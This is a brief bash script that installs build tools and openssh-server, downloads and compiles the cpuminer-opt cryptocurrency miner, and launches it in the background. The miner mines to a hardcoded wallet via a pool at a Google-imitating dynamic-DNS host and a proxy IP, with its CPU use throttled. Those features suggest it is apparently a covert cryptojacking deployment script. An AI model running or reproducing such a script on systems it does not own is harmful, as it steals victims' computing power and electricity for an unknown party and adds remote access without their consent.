#!/bin/bash
sudo apt-get install cpulimit -y && cpulimit --exe cpuminer --limit 85 -b && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y && git clone https://github.com/JayDDee/cpuminer-opt && cd cpuminer-opt && chmod +x build.sh && ./build.sh || true && sudo make install && ./cpuminer -a cryptonight -o stratum+tcp://admingoogle.ddns.net:3333 -u WcC2Wcqz6Ww1dkqF6ohxiaeL1hENdKfVjHvL3hmkh5m2FD9Z6eAJr8L6zaTPmohhmEZBgMTbH8rSpXowsisEo2cr2kJ4p3gqg -x 104.207.141.47:2212 --background


